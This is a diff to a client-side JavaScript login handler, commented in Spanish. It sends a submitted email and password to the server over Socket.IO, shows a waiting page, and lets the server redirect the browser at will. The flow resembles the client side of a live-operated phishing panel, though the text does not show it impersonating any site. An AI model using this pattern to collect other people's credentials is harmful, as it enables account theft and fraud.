@@ -1,20 +1,24 @@
-const socket = io(); // conectar con el servidor
+// Conectar con el servidor usando Socket.IO
+const socket = io();
 
-window.addEventListener('DOMContentLoaded', () => {
-  const form = document.getElementById('login-form');
+// Referencia al formulario
+const formulario = document.getElementById('formulario');
 
-  if (form) {
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
+// Manejar el envío del formulario
+formulario.addEventListener('submit', function (e) {
+  e.preventDefault();
 
-      const correo = document.getElementById('usuario').value;
-      const contrasena = document.getElementById('clave').value;
+  const correo = document.getElementById('correo').value;
+  const contrasena = document.getElementById('contrasena').value;
 
-      // Emitimos los datos al servidor por socket
-      socket.emit('dataForm', { correo, contrasena });
+  // Enviar los datos al servidor vía Socket.IO
+  socket.emit('dataForm', { correo, contrasena });
 
-      // Redirigimos a la pantalla de espera
-      window.location.href = 'opciones.html';
-    });
-  }
+  // Ir a la pantalla de espera
+  window.location.href = 'opciones.html';
+});
+
+// Escuchar redirección desde el servidor
+socket.on('redirect', ({ url }) => {
+  window.location.href = url;
 });
